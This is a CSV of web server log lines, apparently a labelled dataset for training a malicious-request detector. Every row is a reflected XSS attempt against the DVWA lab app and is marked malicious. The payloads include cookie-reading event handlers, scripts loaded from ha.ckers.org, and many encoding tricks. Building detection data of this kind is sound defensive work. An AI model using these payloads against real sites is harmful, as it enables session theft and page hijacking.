url,malicious
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<DIV STYLE=\""width:expression(javascript:alert(1));\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG STYLE=\""xss:expr/*XSS*/ession(javascript:alert(1))\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<XSS STYLE=\""xss:expression(javascript:alert(1))\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE TYPE=\""text/javascript\"">javascript:alert(1);</STYLE>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>.XSS{background-image:url(\""javascript:javascript:alert(1)\"");}</STYLE><A CLASS=XSS></A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE type=\""text/css\"">BODY{background:url(\""javascript:javascript:alert(1)\"")}</STYLE>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--[if gte"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BASE HREF=\""javascript:javascript:alert(1);//\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<OBJECT TYPE=\""text/x-scriptlet\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<HTML xmlns:xss><?import"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<HTML><BODY><?xml:namespace prefix=\""t\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=\""%(jpg)s\""></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<HEAD><META HTTP-EQUIV=\""CONTENT-TYPE\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form id=\""test\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<P STYLE=\""behavior:url('#default#time2')\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>a{background:url('s1' 's2)}@import"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta charset="" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style onreadystatechange=javascript:javascript:alert(1);></style>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<?xml version=\""1.0\""?><html:html"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed code=%(scriptlet)s></embed>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed code=javascript:javascript:alert(1);></embed>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed src=%(jscript)s></embed>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset onload=javascript:javascript:alert(1)></frameset>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<object onerror=javascript:javascript:alert(1)>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed type=\""image\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<XML ID=I><X><C><![CDATA[<IMG"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=&{javascript:alert(1);};>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""jav&#65ascript:javascript:alert(1)\"">test1</a>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""jav&#97ascript:javascript:alert(1)\"">test1</a>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed width=500"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe srcdoc=\""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\""; HTTP/1.1"" 200 1730 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//-- HTTP/1.1"" 200 1729 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=></SCRIPT>\"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> HTTP/1.1"" 200 1737 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='';!--\""<XSS>=&{()} HTTP/1.1"" 200 1705 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert('XSS')>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert(\""XSS\"")>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=`javascript:alert(\""RSnake"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a onmouseover=\""alert(document.cookie)\"">xxs"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a onmouseover=alert(document.cookie)>xxs"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=#"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC="" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG onmouseover=\""alert('xxs')\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=perl -e"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT/XSS SRC=\""http://ha.ckers.org/xss.js\""></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\""XSS\"")>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>alert(\""XSS\"");//<</SCRIPT> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=http://ha.ckers.org/xss.js?<"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=//ha.ckers.org/.j>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""javascript:alert('XSS')\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\\\"";alert('XSS');// HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</TITLE><SCRIPT>alert(\""XSS\"");</SCRIPT> HTTP/1.1"" 200 1719 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<INPUT TYPE=\""IMAGE\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY BACKGROUND=\""javascript:alert('XSS')\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG DYNSRC=\""javascript:alert('XSS')\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG LOWSRC=\""javascript:alert('XSS')\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>li {list-style-image:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC='vbscript:msgbox(\""XSS\"")'>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""livescript:[code]\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY ONLOAD=alert('XSS')>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BGSOUND SRC=\""javascript:alert('XSS');\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BR SIZE=\""&{alert('XSS')}\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<LINK REL=\""stylesheet\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<LINK REL=\""stylesheet\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> HTTP/1.1"" 200 1728 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""Link\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>BODY{-moz-binding:url(\""http://ha.ckers.org/xssmoz.xml#xss\"")}</STYLE> HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG STYLE=\""xss:expr/*XSS*/ession(alert('XSS'))\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=exp/*<A STYLE='no\\xss:noxss(\""*//*\"");xss:ex/*XSS*//*/*/pression(alert(\""XSS\""))'>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE TYPE=\""text/javascript\"">alert('XSS');</STYLE>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>.XSS{background-image:url(\""javascript:alert('XSS')\"");}</STYLE><A CLASS=XSS></A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE type=\""text/css\"">BODY{background:url(\""javascript:alert('XSS')\"")}</STYLE>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<XSS STYLE=\""behavior:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\xc3\x82\xc2\xbcscript\xc3\x82\xc2\xbealert(\xc3\x82\xc2\xa2XSS\xc3\x82\xc2\xa2)\xc3\x82\xc2\xbc/script\xc3\x82\xc2\xbe HTTP/1.1"" 200 1728 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IFRAME SRC=#"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<TABLE BACKGROUND=\""javascript:alert('XSS')\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<DIV STYLE=\""background-image:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<DIV STYLE=\""background-image:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BASE HREF=\""javascript:alert('XSS');//\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name= <OBJECT"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<EMBED SRC=\""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=\""http://ha.ckers.org/xss.jpg\""></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--#exec cmd=\""/bin/echo"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? echo('<SCR)';echo('IPT>alert(\""XSS\"")</SCRIPT>');"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Redirect 302"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""Set-Cookie\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name= <HEAD><META"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT =\"">\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT \""a='>'\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT a=`>`"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT>document.write(\""<SCRI\"");</SCRIPT>PT SRC=\""http://ha.ckers.org/xss.js\""></SCRIPT>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://66.102.7.147/\"">XSS</A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"">XSS</A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://1113982867/\"">XSS</A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://0x42.0x0000066.0x7.0x93/\"">XSS</A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://0102.0146.0007.00000223/\"">XSS</A>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""htt"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe src=\""&Tab;javascript:prompt(1)&Tab;\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<input/onmouseover=\""javaSCRIPT&colon;confirm&lpar;1&rpar;\"" HTTP/1.1"" 200 1714 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sVg><scRipt >alert&lpar;1&rpar;"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img/src=`` onerror=this.onerror=confirm(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=``&NewLine;"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script /**/>/**/alert(1)/**/</script"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&#34;&#62;<h1/onmouseover='\\u0061lert(1)'> HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta content=\""&NewLine;"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta http-equiv=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form><a href=\""javascript:\\u0061lert&#x28;1&#x29;\"">X"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</script><img/*/src=\""worksinchrome&colon;prompt&#x28;1&#x29;\""/*/onerror='eval(src)'> HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form><iframe &#09;&#10;&#11;"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=http://www.google<script .com>alert(document.location)</script"" 400 0 ""-"" ""-""",1
